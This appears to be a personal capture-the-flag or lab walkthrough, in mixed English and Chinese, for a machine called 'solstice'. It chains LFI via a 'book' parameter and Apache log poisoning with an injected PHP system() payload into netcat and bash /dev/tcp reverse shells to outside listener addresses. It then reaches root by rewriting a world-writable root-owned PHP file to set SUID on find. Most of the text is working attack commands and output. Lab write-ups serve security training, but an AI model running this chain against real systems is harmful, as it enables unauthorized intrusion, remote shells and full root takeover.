```Bash
nmap -p- $IP -sV -sC --open
# -sV: Probe open ports to determine service/version info.
# -sC: Equivalent to --script=default, which runs a set of default scripts against the target.

ftp $IP 2121 
# 2121 port

For an FTP server that allows anonymous access, the credentials are typically:

Username: anonymous
Password: <any email address> (or sometimes just anonymous)

Most FTP servers that allow anonymous login will accept any string as the password. Commonly, users just enter their email address as a form of identification.
```

  ### 日志中毒

让我们使用日志中毒攻击来注入我们的有效载荷。

```
kali@kali:~$ echo "GET <?php system('nc -e /bin/bash 192.168.118.9 444'); ?> HTTP/1.1" | nc 192.168.120.167 80
```

首先，我们将启动我们的监听器。

```
kali@kali:~$ sudo nc -nvlp 444
listening on [any] 444 ...
```

接下来，我们使用 LFI 触发我们的有效载荷。

```
kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log
```

```Bash
ftp> quote PASV
227 Entering Passive Mode (192,168,209,72,14,178)
# Using passive mode is often necessary when the client is behind a firewall 
# that restricts incoming connections, as it allows the client to initiate both the command and data connections.
```

  

```Bash
nc -nv 192.168.209.72 3762
\#This command tells Netcat to connect (-nv stands for "no DNS resolution" and 
#"verbose") to the specified IP address and port.
\#It can use if ftp no resopence. 
```

since it have 3 port server, (80, 8593, 54787) so, no Nikto, for easy get blocked, too many request.

  

since we find  
  
`<a href="index.php?book=list">Book List</a>`

we try:

view-source:[http://192.168.197.72:8593/index.php?book=../../../../../etc/passwd](http://192.168.197.72:8593/index.php?book=../../../../../etc/passwd)

also in nmpa we find apache, so we try

[http://192.168.197.72:8593/index.php?book=../../../../../../var/www/html/index.php](http://192.168.197.72:8593/index.php?book=../../../../../../var/www/html/index.php)

[http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log](http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log)

  

```Bash
nc -nv 192.168.197.72 80
192.168.197.72 80 (http) open
GET /?<php system($_GET['cmd]); ?>
```

  

[http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id](http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id)

  

```Bash
bash -i >& /dev/tcp/192.168.45.227/9090 0>&1
# wrap the revershell 
bash -c 'bash -i >& /dev/tcp/192.168.45.164/9090 0>&1'
```

```Bash
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.192.72%2F9090%200%3E%261%27
```

  

user

miguel:x:1000:1000:,,,:/home/miguel:/bin/bash

  

  

view-source:[http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log](http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log)

  

[http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=id](http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=id)

```
ps aux # 
```

- `ps`：process status，用于显示系统中正在运行的进程信息。
    
- `a`：显示所有用户的进程，而不仅仅是当前用户的。
    
- `u`：以用户为主的格式（user-oriented format），会显示进程的所属用户、CPU 和内存占用等。
    
- `x`：显示没有控制终端的进程（比如后台运行的守护进程

```
www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv
ls -l /var/tmp/sv
total 4
-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php
```

since index.php is : -rwxrwxrwx 1 root root 
so we can edit it get root
 how to edit a  root :root php file to get a root 
 ```
 我们可以使用这个文件以 root 身份执行命令。让我们`find`使用 SUID 位来运行。

```
www-data@solstice:/var/tmp/webserver$ echo "<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php
echo "<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php

www-data@solstice:/var/tmp/webserver$ curl localhost:57
curl localhost:57

www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find
ls -l /usr/bin/find
-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
```

然后我们就可以用它`find`来升级我们的shell。

```
www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit
find . -exec /bin/bash -p \; -quit
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
 ```


also can copy dash, from bin to tmp, and chmod +s of dash 
_